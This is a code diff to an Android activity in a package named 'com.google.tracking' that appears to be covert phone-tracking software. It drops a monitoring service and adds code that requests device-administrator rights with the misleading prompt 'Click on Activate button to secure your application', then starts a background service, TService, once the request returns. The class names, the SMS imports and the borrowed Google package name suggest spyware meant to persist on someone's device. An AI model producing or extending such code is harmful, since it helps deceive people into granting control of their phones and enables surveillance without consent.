@@ -2,19 +2,18 @@ package com.google.tracking;
 
 import android.app.Activity;
 import android.app.PendingIntent;
+import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.ServiceConnection;
 import android.os.Bundle;
-import android.os.IBinder;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
-import com.google.tracking.service.MonitoringService;
+import com.google.tracking.service.DeviceAdminDemo;
 
 
 public class TrackingActivity extends Activity {
@@ -22,6 +21,10 @@ public class TrackingActivity extends Activity {
     EditText txtPhoneNo;
     EditText txtMessage;
 
+
+    private static final int REQUEST_CODE = 0;
+    private DevicePolicyManager mDPM;
+    private ComponentName mAdminName;
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -31,8 +34,39 @@ public class TrackingActivity extends Activity {
 
 
 
-        Intent intent = new Intent(this, MonitoringService.class);
-        startService(intent);
+//        Intent monitoring_intent = new Intent(this, MonitoringService.class);
+//        startService(monitoring_intent);
+
+
+        try {
+            // Initiate DevicePolicyManager.
+            mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            mAdminName = new ComponentName(this, DeviceAdminDemo.class);
+
+            if (!mDPM.isAdminActive(mAdminName)) {
+                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
+                startActivityForResult(intent, REQUEST_CODE);
+            } else {
+                // mDPM.lockNow();
+                // Intent intent = new Intent(MainActivity.this,
+                // TrackDeviceService.class);
+                // startService(intent);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+
+        if (REQUEST_CODE == requestCode) {
+            Intent intent = new Intent(TrackingActivity.this, TService.class);
+            startService(intent);
+        }
     }
 
     private void initSendSMS() {
